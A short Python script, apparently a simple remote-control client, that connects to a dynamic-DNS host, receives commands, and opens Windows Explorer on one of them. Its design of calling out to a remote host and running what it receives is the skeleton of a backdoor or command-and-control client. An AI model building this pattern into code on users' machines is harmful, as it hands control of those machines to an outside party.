import socket
import os

host = 'Icens.ddns.net'
port = 12345


def client_listener():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))

    try:
        while True:
            command = client_socket.recv(1024).decode()
            if command:
                print(f"Empfangener Befehl: {command}")
                if command.lower() == "explorer":
                    os.system("explorer")
                if command.lower() == "exit":
                    break
    finally:
        client_socket.close()


if __name__ == "__main__":
    client_listener()